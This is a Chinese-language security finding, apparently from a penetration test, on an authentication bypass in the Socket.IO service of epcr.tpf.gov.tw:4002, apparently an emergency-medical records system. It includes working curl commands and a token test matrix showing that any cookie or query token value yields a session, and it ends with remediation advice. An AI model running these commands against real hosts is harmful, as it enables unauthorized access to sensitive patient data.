# EPCR 4002 Socket.IO 鉴权绕过:任意 token 值可绕过 express-jwt 获取 SID

- ID: `d0f8ec00-117f-4c66-9f9c-65f8e1b64cf7`
- Severity: **high**
- Status: open
- Type: Authentication Bypass
- Target: `https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling`
- Conversation: `c540ef6b-4c80-4589-8e93-ff57dd1bb32e`
- Created: 2026-08-29 20:16:31.033854739+08:00

## Description

epcr.tpf.gov.tw:4002 的 Socket.IO 服务根 namespace (`/`) 鉴权中间件存在严重配置错误。express-jwt 仅在 `Authorization: Bearer <JWT格式>` 形式下触发严格校验并返回 `jwt malformed` 错误，但通过 cookie (`token=<任意值>`) 或 query (`?token=<任意值>`) 携带任何值（包括空字符串、`anonymous`、`admin`、`test`、完整 JWT）均能绕过鉴权返回合法 SID。攻击者可建立未授权 Socket.IO 连接至 SocketIoService.js 的根 namespace，进而参与 PCDT 实时事件流（虽然业务事件会被服务端销毁会话，但连接建立本身已构成严重漏洞）。

## Preconditions

无。无需凭证，仅需网络可达 epcr.tpf.gov.tw:4002 即可发起攻击

## Reproduction

1. 打开终端
2. 执行绕过命令：`curl -H "Cookie: token=anonymous" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"`
3. 观察响应：`{"sid":"1G4n16jqnrJtOxXTAAQD","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":5000}`
4. 验证：未携带任何凭证时返回 HTML `<h1>No authorization token was found</h1>` 或 `<h1>jwt malformed</h1>`
5. 完整未授权 Socket.IO 通道已建立

## Evidence

**目标**: https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling (根 namespace)

**触发 express-jwt 的请求**:
```
curl -H "Authorization: Bearer anonymous" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"
→ <h1>jwt malformed</h1>  (express-jwt 错误，证明鉴权层存在)
```

**绕过鉴权拿 SID**:
```
curl -H "Cookie: token=anonymous" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"
→ {"sid":"1G4n16jqnrJtOxXTAAQD","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":5000}

curl "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling?token=anonymous"
→ 同样返回合法 SID

curl -H "Cookie: jwt=<valid JWT>" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"
→ 同样返回合法 SID
```

**全 token 形式测试矩阵**:
| Token 形式 | 响应 |
|------------|------|
| `Bearer anonymous` | HTML `jwt malformed` |
| `Bearer <valid JWT>` | HTML `jwt malformed` |
| `Cookie token=anonymous` | JSON SID ✓ |
| `Cookie token=<JWT>` | JSON SID ✓ |
| `Cookie token=` (空) | JSON SID ✓ |
| `Cookie auth=anonymous` | JSON SID ✓ |
| `Cookie jwt=<JWT>` | JSON SID ✓ |
| `?token=anonymous` | JSON SID ✓ |

**SID 拿到后**: WS 升级支持，业务事件会被服务端销毁会话（400 Bad Request `Session ID unknown` 或 SSL EOF），但未授权连接已建立

## Impact

1. **认证失效**: 任何未授权用户均可建立 Socket.IO 连接至根 namespace（SocketIoService.js 的核心订阅 namespace）
2. **业务探测面**: 攻击者可探测业务事件订阅触发器，识别服务端硬编码事件名（已识别 `client.subscribe`/`client.unsubscribe`）
3. **DoS 风险**: 长轮询挂起可消耗服务端 socket 资源
4. **PHI 推送通道**: SocketIoService.js 推送 PCDT 事件（医院Uuid + 病例事件流），若业务事件订阅能成功，攻击者可订阅任意医院事件流，**实时接收全台湾紧急医疗救护 PCDT 数据**
5. **配置不当**: express-jwt 与自定义鉴权中间件使用不同的 token 提取方式，导致鉴权层形同虚设

## Recommendation

1. **统一鉴权中间件**: 让 express-jwt 与自定义 token 中间件使用相同的 token 提取逻辑（如全部检查 Bearer header）
2. **Express-jwt 严格校验**: 配置 express-jwt 的 `algorithms` 白名单（仅允许 RS256/HS256），禁用 `none` 算法
3. **多 namespace 鉴权一致性**: 对所有 namespace 应用相同的 token 鉴权（不仅限于根 NS）
4. **WS 鉴权同步**: 升级到 WebSocket 后重新校验 token，防止绕过
5. **业务事件订阅授权**: 订阅请求必须验证医院Uuid 与当前用户权限匹配（避免任意用户订阅任意医院）
